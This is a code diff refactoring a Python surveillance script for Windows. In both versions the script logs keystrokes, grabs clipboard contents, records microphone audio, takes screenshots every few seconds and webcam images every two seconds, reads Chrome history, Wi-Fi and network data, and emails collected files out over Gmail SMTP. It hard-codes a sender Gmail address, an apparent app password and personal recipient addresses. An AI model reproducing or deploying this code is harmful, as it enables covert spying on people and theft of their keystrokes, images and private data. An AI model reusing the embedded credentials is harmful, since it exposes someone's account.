@@ -1,4 +1,3 @@
-# Libraries 
 import os
 import socket
 import platform
@@ -19,48 +18,41 @@ import win32clipboard
 from scipy.io.wavfile import write
 import sounddevice as sd
 from pynput import keyboard
-from cv2 import VideoCapture, imwrite, destroyWindow
+from cv2 import VideoCapture, imwrite
 import schedule
 import time
+import shutil
 
 # Global Variables
-
-system_info = "system_info.txt"
-clipboard_info = "clipboard.txt"
-audio_info = "audio.wav"
-global screenshot_info 
-screenshot_info = "screenshot.png"
-webcam_shot_info = "webcam.png"
-browser_history_info = "browser_history.txt"
-wifi_info = "wifi_info.txt"
-consolidated_log = "consolidated_log.txt"
-
-email_address = "work.nihalrahman@gmail.com"  # Enter email here
-password = "ffqefrxfjhhcubhz"  # Enter password here
-
+email_address = "work.nihalrahman@gmail.com"  # Enter sender email
+password = "ffqefrxfjhhcubhz"  # Enter sender app password
 toaddr = "prabhatbajpai2005@gmail.com"  # Enter recipient email
+
 file_path = os.getcwd() + "\\"  # File save path
 key = Fernet.generate_key()  # Generate an encryption key
 fernet = Fernet(key)
 
-print("Hit ESC to stop recording")
+currtime = datetime.now().strftime("%Y%m%d%H%M%S")
+sessions_folder = os.path.join(file_path, f"sessions", f"session_{currtime}")
+screenshots_folder = os.path.join(sessions_folder, "screenshots")
+webcam_folder = os.path.join(sessions_folder, "webcam_images")
 
-# Send Email
+# Create necessary directories
+os.makedirs(sessions_folder, exist_ok=True)
+os.makedirs(screenshots_folder, exist_ok=True)
+os.makedirs(webcam_folder, exist_ok=True)
+
+
+# Email functionality
 def send_email(filename, attachment, toaddr):
-    fromaddr = email_address
+    """Send an email with the specified attachment."""
     msg = MIMEMultipart()
-    msg['From'] = fromaddr
+    msg['From'] = email_address
     msg['To'] = toaddr
     msg['Subject'] = "Log File"
-    body = f"Attached file: " + filename
-    msg.attach(MIMEText(body, 'plain'))
+    msg.attach(MIMEText(f"Attached file: {filename}", 'plain'))
 
-        # Check if the file exists before attaching it
-    if not os.path.exists(attachment):
-        print(f"Error: Attachment file {attachment} not found.")
-        return
-
-    try:
+    if os.path.exists(attachment):  # Ensure the file exists
         with open(attachment, 'rb') as attach_file:
             part = MIMEBase('application', 'octet-stream')
             part.set_payload(attach_file.read())
@@ -68,156 +60,130 @@ def send_email(filename, attachment, toaddr):
             part.add_header('Content-Disposition', f"attachment; filename={filename}")
             msg.attach(part)
 
-        # Setup the server and send the email
-        with smtplib.SMTP('smtp.gmail.com', 587) as s:
-            s.starttls()  # Start TLS encryption
-            s.login(fromaddr, password)
-            s.sendmail(fromaddr, toaddr, msg.as_string())
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:  # Connect to SMTP server
+            server.starttls()
+            server.login(email_address, password)
+            server.sendmail(email_address, toaddr, msg.as_string())
             print(f"Email sent successfully to {toaddr}")
-    except smtplib.SMTPException as e:
-        print(f"SMTP error occurred: {e}")
-    except Exception as e:
-        print(f"An error occurred: {e}")
+    else:
+        print(f"Attachment file {attachment} not found.")
 
-# System Information
+
+# Data collection functions
 def system_information():
-    with open(file_path + system_info, "a") as f:
+    """Gather system information and save it to a text file."""
+    with open(os.path.join(sessions_folder, "system_info.txt"), "w") as f:
         hostname = socket.gethostname()
-        IPAddr = socket.gethostbyname(hostname)
+        f.write(f"Hostname: {hostname}\n")
+        f.write(f"Private IP: {socket.gethostbyname(hostname)}\n")
         try:
-            public_ip = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + public_ip + '\n')
+            f.write(f"Public IP: {get('https://api.ipify.org').text}\n")
         except Exception:
-            f.write("Couldn't get Public IP Address.\n")
-        f.write(f"Processor: {platform.processor()}\nSystem: {platform.system()} {platform.version()}\n")
-        f.write(f"Machine: {platform.machine()}\nHostname: {hostname}\nPrivate IP: {IPAddr}\n")
+            f.write("Could not retrieve public IP address.\n")
+        f.write(f"Processor: {platform.processor()}\n")
+        f.write(f"System: {platform.system()} {platform.version()}\n")
+        f.write(f"Machine: {platform.machine()}\n")
 
-# Network Activity
+
+def copy_clipboard():
+    """Copy data from the clipboard and save it."""
+    clipboard_path = os.path.join(sessions_folder, "clipboard.txt")
+    with open(clipboard_path, "w") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            f.write(f"Clipboard Data: {win32clipboard.GetClipboardData()}\n")
+            win32clipboard.CloseClipboard()
+        except:
+            f.write("Clipboard could not be accessed.\n")
+
+
+def microphone():
+    """Record audio for a specified duration and save it as a .wav file."""
+    myrecording = sd.rec(int(15 * 44100), samplerate=44100, channels=2)
+    sd.wait()
+    write(os.path.join(sessions_folder, "audio.wav"), 44100, myrecording)
+
+
+def screenshots():
+    """Take a screenshot and save it to the screenshots folder."""
+    im = ImageGrab.grab()
+    im.save(os.path.join(screenshots_folder, f"screenshot_{datetime.now().strftime('%Y%m%d%H%M%S')}.png"))
+
+
+def webcam_capture():
+    """Capture an image from the webcam and save it."""
+    cam = VideoCapture(0)
+    result, image = cam.read()
+    if result:
+        imwrite(os.path.join(webcam_folder, f"webcam_{datetime.now().strftime('%Y%m%d%H%M%S')}.png"), image)
+    cam.release()
+
+
+# Keylogging functionality
+def on_press(key):
+    """Handle key press events."""
+    log_path = os.path.join(sessions_folder, "key_log.txt")
+    with open(log_path, "a") as f:
+        if hasattr(key, 'char') and key.char:  # Record printable characters
+            f.write(key.char)
+        elif key == keyboard.Key.space:  # Record spaces as whitespace
+            f.write(" ")
+        else:
+            f.write(f"[{key}]")  # Record special keys
+
+
+def on_release(key):
+    """Stop the keylogger when the escape key is pressed."""
+    if key == keyboard.Key.esc:
+        return False
+
+
+# Network activity
 def network_activity():
-    with open(file_path + 'network_info.txt', "w") as f:
+    """Log active network connections."""
+    with open(os.path.join(sessions_folder, 'network_info.txt'), "w") as f:
         connections = psutil.net_connections(kind='inet')
         for conn in connections:
             f.write(f"IP: {conn.raddr.ip if conn.raddr else 'N/A'}, Port: {conn.raddr.port if conn.raddr else 'N/A'}, Status: {conn.status}\n")
 
-# Clipboard Data
-def copy_clipboard():
-    clipboard_file_path = os.path.join(sessions_folder, clipboard_info)
-    with open(clipboard_file_path, "a") as f:
-        try:
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            f.write("Clipboard Data:\n" + pasted_data + '\n')
-        except:
-            f.write("Clipboard Could not be copied.\n")
+
+# Wi-Fi information
+def wifi_info_fetch():
+    """Fetch Wi-Fi information."""
+    try:
+        networks = subprocess.check_output("netsh wlan show networks", shell=True)
+        with open(os.path.join(sessions_folder, "wifi_info.txt"), "w") as f:
+            f.write(networks.decode('utf-8'))
+    except Exception as e:
+        print("Wi-Fi info fetch error:", e)
 
 
-
-currtime = datetime.now().strftime("%Y%m%d%H%M%S")
-
-
-sessions_folder = os.path.join(file_path, f"sessions", f"session{currtime}")
-webcam_folder = os.path.join(sessions_folder, "webcam_images")  # Folder for webcam images
-screenshots_folder = os.path.join(sessions_folder, "screenshots")
-keys_info = os.path.join(sessions_folder, "key_log.txt")
-
-# Microphone Recording
-def microphone():
-    fs = 44100  # Sample rate
-    seconds = 15  # Duration
-    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-    sd.wait()
-    audio_file_path = os.path.join(sessions_folder, audio_info)
-    write(audio_file_path, fs, myrecording)
-    # write(sessions_folder+audio_info, fs, myrecording)
-
-
-# Create the folders if they don't exist
-if not os.path.exists(sessions_folder):
-    os.makedirs(sessions_folder)
-if not os.path.exists(screenshots_folder):
-    os.makedirs(screenshots_folder)
-if not os.path.exists(webcam_folder):
-    os.makedirs(webcam_folder)
-
-
-# Screenshot Capture
-def screenshots():
-    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")  # Generate a unique timestamp
-    screenshot_file =  f"{screenshots_folder}/screenshot_{timestamp}.png"  # Save in the 'screenshots' folder
-    im = ImageGrab.grab()
-    im.save(screenshot_file)
-
-schedule.every(4).seconds.do(screenshots)
-
-# Webcam Capture
-def webcam_capture():
-    cam = VideoCapture(0)
-    result, image = cam.read()
-    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")  # Generate a unique timestamp
-    webcam_shot_file =  f"{webcam_folder}/webcam_{timestamp}.png" # Save in the 'webcam_images' folder
-    if result:
-        imwrite(webcam_shot_file, image)
-    cam.release()
-    # destroyWindow("webCam")
-
-schedule.every(2).seconds.do(webcam_capture)
-
-# Browser History Fetch
+# Browser history
 def fetch_browser_history():
+    """Retrieve browser history from Chrome."""
     history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
     try:
         conn = sqlite3.connect(history_path)
         cursor = conn.cursor()
-        with open(file_path + browser_history_info, "w") as f:
+        with open(os.path.join(sessions_folder, "browser_history.txt"), "w") as f:
             cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
             for row in cursor.fetchall():
                 f.write(f"URL: {row[0]}, Title: {row[1]}, Visits: {row[2]}, Last Visit: {datetime.utcfromtimestamp(row[3]/1000000 - 11644473600)}\n")
     except Exception as e:
         print("Could not read browser history:", e)
 
-# Wi-Fi Information
-def wifi_info_fetch():
-    try:
-        networks = subprocess.check_output("netsh wlan show networks", shell=True)
-        with open(file_path + wifi_info, "w") as f:
-            f.write(networks.decode('utf-8'))
-    except Exception as e:
-        print("Wi-Fi info fetch error:", e)
 
-# Keylogger
-def on_press(key):
-    try:
-        # Handle printable characters
-        k = key.char if key.char else str(key)
-    except AttributeError:
-        # Handle special keys
-        k = str(key)
-    
-    # Write directly to the file on each key press
-    with open(keys_info, "a") as f:
-        if k.find("Key.space") > -1:
-            f.write("\n")  # Add a new line for space
-        elif k.find("Key") == -1:
-            f.write(k)  # Write printable keys
-        else:
-            f.write(f"[{k}]")  # Write special keys like [Key.enter], [Key.shift]
-    
+# Scheduled tasks
+schedule.every(4).seconds.do(screenshots)
+schedule.every(2).seconds.do(webcam_capture)
 
-    
 
-def write_file(keys):
-    with open(file_path + keys_info, "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write("\n")
-            elif k.find("Key") == -1:
-                f.write(k)
+def run_scheduled_tasks():
+    """Run scheduled tasks."""
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        return False
 
 # Main Execution
 system_information()
@@ -225,29 +191,18 @@ network_activity()
 copy_clipboard()
 screenshots()
 webcam_capture()
-# fetch_browser_history()
 wifi_info_fetch()
 microphone()
 
-filename = system_info  # This refers to the file name 'system_info.txt'
-attachment = os.path.join(file_path, system_info)  # Full file path to the system_info.txt file
-toaddr = "nd81167@gmail.com"  # Recipient's email address
+filename = "system_info.txt"
+attachment = os.path.join(sessions_folder, filename)
+send_email(filename, attachment, toaddr)
 
-send_email(filename,attachment,toaddr)
-
-def run_scheduled_tasks():
-    while True:
-        schedule.run_pending()
-        time.sleep(1)
-
-def start_keylogger():
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-
-
+# Start scheduled tasks in a separate thread
 schedule_thread = threading.Thread(target=run_scheduled_tasks)
 schedule_thread.daemon = True
 schedule_thread.start()
 
-# Start the keylogger in the main thread
-start_keylogger()
+# Start keylogger in the main thread
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
